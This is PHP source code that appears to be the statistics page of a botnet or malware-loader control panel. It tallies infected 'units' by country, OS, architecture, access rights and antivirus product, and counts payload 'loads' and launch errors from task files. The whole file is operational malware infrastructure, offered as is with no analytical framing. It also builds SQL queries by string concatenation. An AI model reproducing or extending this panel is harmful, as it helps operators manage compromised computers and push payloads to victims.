<?php
       
    session_start();

    error_reporting( 0 );

    if ( !( isset( $_SESSION['Name'] ) ) )
    {
       header( "Location: login.php" );
       exit;
    }

    function GetBG()
    {
       static $e = "0";

       if ( $e == "1" )
       {
          $e = "0";
          return "#E4E4E4";
       }
       
       if ( $e == "0" )
       {
          $e = "1";
          return "#dfdede";
       }
    }

    function GetTaskCount() 
    {
       $filelist = glob( "./tasks/*.tsk" );

       if ( $handle = opendir( "./tasks/" ) ) 
       {     
          while ( $entry = readdir( $handle ) ) 
          {
            if ( strpos( $entry, "*" ) === 0 ) 
            {
               $filelist[] = $entry;
            }
          }

          closedir( $handle );

          return count( $filelist );
       }
    }

    function GetloadsCount() 
    {
       $filelist = glob( "./tasks/*.tsk" );

       if ( $handle = opendir( "./tasks/" ) ) 
       {     
          while ( $entry = readdir( $handle ) ) 
          {
            if ( strpos( $entry, "*" ) === 0 ) 
            {
               $filelist[] = $entry;
            }
          }

          closedir( $handle );
          
          $done = 0; 

          for ( $i = 0; $i < count( $filelist ); $i++ )
          {
             $done = $done + file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".d0" );
          }
                    
       }
       return $done;
    }

    function GetloadsErrorsCount() 
    {
       $filelist = glob( "./tasks/*.tsk" );

       if ( $handle = opendir( "./tasks/" ) ) 
       {     
          while ( $entry = readdir( $handle ) ) 
          {
            if ( strpos( $entry, "*" ) === 0 ) 
            {
               $filelist[] = $entry;
            }
          }

          closedir( $handle );

          $errors = 0;

          for ( $i = 0; $i < count( $filelist ); $i++ )
          {
             $errors = $errors + file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".e0" );
             $errors = $errors + file_get_contents( "./tasks/" . basename( $filelist[$i], ".tsk" ) . ".e1" );
          }
                    
       }
       return $errors;
    }

    function CheckSQL()
    {
       include( "config.php" );
       if ( @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ) == false )
       {
          echo "SQL connection filed, check host, name, login and password"; 
          die;
       }
    }

    function GetUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units' );
       mysql_close();
       return mysql_num_rows( $result );
    }

    function GetOnlineUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units WHERE online > ' . ( time() - 60 ) );
       mysql_close();
       return mysql_num_rows( $result );
    }

    function GetOnlinePerDayUnitsCount()
    {
       include( "config.php" );
       mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result =  mysql_query( 'SELECT * FROM units WHERE online > ' . ( time() - 86400 ) );
       mysql_close();
       return mysql_num_rows( $result );
    }

    function GetOnlinePerWeekUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units WHERE online > ' . ( time() - 604800 ) );
       mysql_close();
       return mysql_num_rows( $result );
    }
    
    function GetNewPerDayUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query('SELECT * FROM units WHERE reg >' . ( time() - 86400 ) );
       mysql_close(); 
       return mysql_num_rows( $result );
    }

    function GetNewPerWeekUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units WHERE reg > ' . ( time() - 604800 ) );
       return mysql_num_rows( $result );
    }

    function aCountryUnitsCount( $country )
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units WHERE country = "' . $country . '"' );
       mysql_close();
       return mysql_num_rows( $result );
    }


    function GetCoutryUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( "SELECT country, COUNT(country) AS total FROM units GROUP BY country" );
       mysql_close();


       echo "<div align = center> 
                <table cellpadding=1 cellspacing=1 width=1200 class=table style =\"border: 1px solid;\">
                   <tr>                       
                      <td><div align = left>&nbsp;Country:</div></td>
                      <td width=200><div align = center>Units:</div></td>   
                      <td width=200><div align = center>Percent:</div></td>           
                   </tr>";

       while ( $row = mysql_fetch_array( $result ) )
       {
          $gb = GetBG();
          echo "<tr>";
          echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\">&nbsp;" . $row['country'] . "</td>"; 
          echo "   <th bgcolor = " . $gb . "><b>" . aCountryUnitsCount( $row['country'] ) . "</b></th>";

          $percent = aCountryUnitsCount( $row['country'] ) / ( GetUnitsCount() / 100 );

          if ( strlen( $percent ) > 5 )
          {
            $percent = substr( $percent, 0, 5 ); 
          } 

          echo "   <th bgcolor = " . $gb . "><b>" . $percent . "%</b></th>";
 
          echo "</tr>";
       }

       echo "</table>";
    }

    function aVersionUnitsCount( $version )
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units WHERE version = "' . $version . '"' );
       mysql_close();
       return mysql_num_rows( $result );
    }

    function GetVerionsUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( "SELECT version, COUNT(version) AS total FROM units GROUP BY version" );
       mysql_close();


       echo "<div align = center> 
                <table cellpadding=1 cellspacing=1 width=1200 class=table style =\"border: 1px solid;\">
                   <tr>                       
                      <td><div align = left>&nbsp;Version:</div></td>
                      <td width=200><div align = center>Units:</div></td>   
                      <td width=200><div align = center>Percent:</div></td>           
                   </tr>";

       while ( $row = mysql_fetch_array( $result ) )
       {
          $gb = GetBG();
          echo "<tr>";
          echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\">&nbsp;" . $row['version'] . "</td>"; 
          echo "   <th bgcolor = " . $gb . "><b>" . aVersionUnitsCount( $row['version'] ) . "</b></th>";

          $percent = aVersionUnitsCount( $row['version'] ) / ( GetUnitsCount() / 100 );

          if ( strlen( $percent ) > 5 )
          {
            $percent = substr( $percent, 0, 5 ); 
          } 

          echo "   <th bgcolor = " . $gb . "><b>" . $percent . "%</b></th>";
 
          echo "</tr>";
       }

       echo "</table>";
    }

    function aRightsUnitsCount( $ar )
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units WHERE ar = "' . $ar . '"' );
       mysql_close();
       return mysql_num_rows( $result );
    }

    function GetRightsUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( "SELECT ar, COUNT(ar) AS total FROM units GROUP BY ar" );
       mysql_close();


       echo "<div align = center> 
                <table cellpadding=1 cellspacing=1 width=1200 class=table style =\"border: 1px solid;\">
                   <tr>                       
                      <td><div align = left>&nbsp;Access rights:</div></td>
                      <td width=200><div align = center>Units:</div></td>   
                      <td width=200><div align = center>Percent:</div></td>           
                   </tr>";

       while ( $row = mysql_fetch_array( $result ) )
       {
          $gb = GetBG();
          echo "<tr>";
          echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\">&nbsp;" . $row['ar'] . "</td>"; 
          echo "   <th bgcolor = " . $gb . "><b>" . aRightsUnitsCount( $row['ar'] ) . "</b></th>";

          $percent = aRightsUnitsCount( $row['ar'] ) / ( GetUnitsCount() / 100 );

          if ( strlen( $percent ) > 5 )
          {
            $percent = substr( $percent, 0, 5 ); 
          } 

          echo "   <th bgcolor = " . $gb . "><b>" . $percent . "%</b></th>";
 
          echo "</tr>";
       }

       echo "</table>";
    }

    function aArchUnitsCount( $arch )
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units WHERE arch = "' . $arch . '"' );
       mysql_close();
       return mysql_num_rows( $result );
    }

    function GetArchUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( "SELECT arch, COUNT(arch) AS total FROM units GROUP BY arch" );
       mysql_close();


       echo "<div align = center> 
                <table cellpadding=1 cellspacing=1 width=1200 class=table style =\"border: 1px solid;\">
                   <tr>                       
                      <td><div align = left>&nbsp;Architecture:</div></td>
                      <td width=200><div align = center>Units:</div></td>   
                      <td width=200><div align = center>Percent:</div></td>           
                   </tr>";

       while ( $row = mysql_fetch_array( $result ) )
       {
          $gb = GetBG();
          echo "<tr>";
          echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\">&nbsp;" . $row['arch'] . "</td>"; 
          echo "   <th bgcolor = " . $gb . "><b>" . aArchUnitsCount( $row['arch'] ) . "</b></th>";

          $percent = aArchUnitsCount( $row['arch'] ) / ( GetUnitsCount() / 100 );

          if ( strlen( $percent ) > 5 )
          {
            $percent = substr( $percent, 0, 5 ); 
          } 

          echo "   <th bgcolor = " . $gb . "><b>" . $percent . "%</b></th>";
 
          echo "</tr>";
       }

       echo "</table>";
    }

    function aOsUnitsCount( $os )
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units WHERE os = "' . $os . '"' );
       mysql_close();
       return mysql_num_rows( $result );
    }

    function GetOSUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( "SELECT os, COUNT(os) AS total FROM units GROUP BY os" );
       mysql_close();


       echo "<div align = center> 
                <table cellpadding=1 cellspacing=1 width=1200 class=table style =\"border: 1px solid;\">
                   <tr>                       
                      <td><div align = left>&nbsp;Operation System:</div></td>
                      <td width=200><div align = center>Units:</div></td>   
                      <td width=200><div align = center>Percent:</div></td>           
                   </tr>";

       while ( $row = mysql_fetch_array( $result ) )
       {
          $gb = GetBG();
          echo "<tr>";
          echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\">&nbsp;" . $row['os'] . "</td>"; 
          echo "   <th bgcolor = " . $gb . "><b>" . aOsUnitsCount( $row['os'] ) . "</b></th>";

          $percent = aOsUnitsCount( $row['os'] ) / ( GetUnitsCount() / 100 );

          if ( strlen( $percent ) > 5 )
          {
            $percent = substr( $percent, 0, 5 ); 
          } 

          echo "   <th bgcolor = " . $gb . "><b>" . $percent . "%</b></th>";
 
          echo "</tr>";
       }

       echo "</table>";
    }

    function aAVUnitsCount( $av )
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( 'SELECT * FROM units WHERE av = "' . $av . '"' );
       mysql_close();
       return mysql_num_rows( $result );
    }

    function GetAVUnitsCount()
    {
       include( "config.php" );
       @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] );
       mysql_select_db( $conf['dbname'] );
       
       $result = mysql_query( "SELECT av, COUNT(av) AS total FROM units GROUP BY av" );
       mysql_close();


       echo "<div align = center> 
                <table cellpadding=1 cellspacing=1 width=1200 class=table style =\"border: 1px solid;\">
                   <tr>                       
                      <td><div align = left>&nbsp;Antiviral kit:</div></td>
                      <td width=200><div align = center>Units:</div></td>   
                      <td width=200><div align = center>Percent:</div></td>           
                   </tr>";

       while ( $row = mysql_fetch_array( $result ) )
       {
          $gb = GetBG();
          echo "<tr>";
          echo "   <td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\">&nbsp;" . $row['av'] . "</td>"; 
          echo "   <th bgcolor = " . $gb . "><b>" . aAVUnitsCount( $row['av'] ) . "</b></th>";

          $percent = aAVUnitsCount( $row['av'] ) / ( GetUnitsCount() / 100 );

          if ( strlen( $percent ) > 5 )
          {
            $percent = substr( $percent, 0, 5 ); 
          } 

          echo "   <th bgcolor = " . $gb . "><b>" . $percent . "%</b></th>";
 
          echo "</tr>";
       }

       echo "</table>";
    }

    function sTable()
    {
       echo "<table border=\"0\" width=\"1000\" cellspacing=\"0\" cellpadding=\"0\" height=\"5\">
	        <tr>
		   <td></td>
	        </tr>
             </table>";
    }

    include( "header.php" );

    CheckSQL();

    echo "<div align = center> 
             <table cellpadding=1 cellspacing=1 width=1200 class=table style =\"border: 1px solid;\">
                <tr>                       
                   <td><div align = left>&nbsp;Parametr:</div></td>
                   <td><div align = center>Value:</div></td>              
                </tr>";
  

    $gb = GetBG();
    echo "<tr><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\"> " . "Active tasks:" . "</td>"; 
    echo "    <th width=200 bgcolor ="  . $gb . ">" . GetTaskCount() . "</th></tr>";

    $gb = GetBG();
    echo "<tr><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\"> " . "Loads:" . "</td>"; 
    echo "    <th width=200 bgcolor = " . $gb . ">" . GetLoadsCount() . "</th></tr>";

    $gb = GetBG();
    echo "<tr><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\"> " . "Loading/launch errors:" . "</td>"; 
    echo "    <th width=200 bgcolor = " . $gb . ">" . GetLoadserrorsCount() . "</th></tr>";

    $gb = GetBG();
    echo "<tr><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\"> " . "Units:" . "</td>"; 
    echo "    <th width=200 bgcolor = " . $gb . ">" . GetUnitsCount() . "</th><tr>";

    $gb = GetBG();
    echo "<tr><td bgcolor = ". $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\"> " . "Units online:" . "</td>"; 
    echo "    <th width=200 bgcolor =" . $gb . ">" . "<font color = red>" . GetOnlineUnitsCount() . "</font></th><tr>";

    $gb = GetBG();
    echo "<tr><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\"> " . "Units online (day):" . "</td>"; 
    echo "    <th width=200 bgcolor = " . $gb . ">" . GetOnlinePerDayUnitsCount() . "</th><tr>";

    $gb = GetBG();
    echo "<tr><td bgcolor = ". $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\"> " . "Units online (week):" . "</td>"; 
    echo "    <th width=200 bgcolor =" . $gb . ">" . GetOnlinePerWeekUnitsCount() . "</th><tr>";

    $gb = GetBG();
    echo "<td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\"> " . "New units on day:" . "</td>"; 
    echo "   <th width=200 bgcolor = " . $gb . ">" . GetNewPerDayUnitsCount() . "</th><tr>";

    $gb = GetBG();
    echo "<tr><td bgcolor = " . $gb . ">" . "&nbsp;<img src=\"images\ic_6.png\"> " . "New units on week:" . "</td>"; 
    echo "    <th width=200 bgcolor =" . $gb . ">" . GetNewPerWeekUnitsCount() . "</th><tr>";

    echo "   </table>
          </div>";

    sTable();

    echo GetCoutryUnitsCount();

    sTable();

    GetVerionsUnitsCount();

    sTable();

    GetRightsUnitsCount();

    sTable();

    GetArchUnitsCount();

    sTable();

    GetOsUnitsCount();

    sTable();

    GetAVUnitsCount();

    echo "</html>";
?> 
